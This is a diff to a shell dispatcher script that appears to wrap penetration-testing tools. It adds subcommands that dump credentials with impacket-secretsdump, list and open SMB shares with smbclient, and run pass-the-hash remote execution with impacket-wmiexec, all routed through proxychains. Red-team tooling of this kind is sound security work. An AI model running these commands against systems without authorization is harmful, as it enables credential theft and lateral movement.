@@ -84,6 +84,15 @@ if [ "$1" = "zap_vuln_scan" ]; then
 
     elif [ "$1" = "enumerate_aws_meta_data" ]; then
     python3 /scripts/python/enumerate_ec2_metadata_userdata.py
+    elif [ "$1" = "dump_creds" ]; then
+    proxychains impacket-secretsdump -no-pass "$2"
+    elif [ "$1" = "list_smb_shares" ]; then
+    proxychains smbclient -L "$2" -U "$3"
+    elif [ "$1" = "access_smb" ]; then
+    proxychains smbclient "$2" -U "$3"
+    elif [ "$1" = "pass_hashes_wmi_exec" ]; then
+
+    impacket-wmiexec -hashes "$2" "$3"
     
     elif [ "$1" = "help" ]; then
     printf "\n"
